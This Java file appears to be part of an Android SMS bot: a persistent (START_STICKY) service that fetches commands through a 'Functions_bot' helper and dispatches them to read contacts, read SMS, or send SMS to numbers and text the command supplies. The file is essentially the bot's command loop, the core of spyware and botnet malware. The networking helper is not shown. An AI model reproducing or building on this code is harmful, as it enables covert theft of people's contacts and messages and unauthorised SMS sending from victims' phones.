package com.beenet.jose.beenet;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class MyService extends Service {


    public MyService() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();

        //SendMethod.sendMethod();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        doThings();
        return START_STICKY;
    }
    //:D
    private void doThings() {

        Thread secThread = new Thread(new Runnable() {
            @Override
            public void run() {
                Functions_bot fb = new Functions_bot(getApplicationContext());

            fb.getSmsList();
              String valor = fb.getCommands();
                String [] ordParams=null;
                String [] funcParams = valor.split("_");

                if(funcParams.length==2)
                    ordParams = funcParams[1].split("/+");
                switch(funcParams[0])
                {
                    case"getContacts":{

                    fb.getContactsList();
                    }
                    break;
                    case"sendSms":{
                     fb.sendSMS(ordParams[0], ordParams[1]);
                    }
                    break;
                    case"getSms":{
                        fb.getSmsList();
                    }
                    break;


                }
            }
        });
        secThread.start();
    }

}
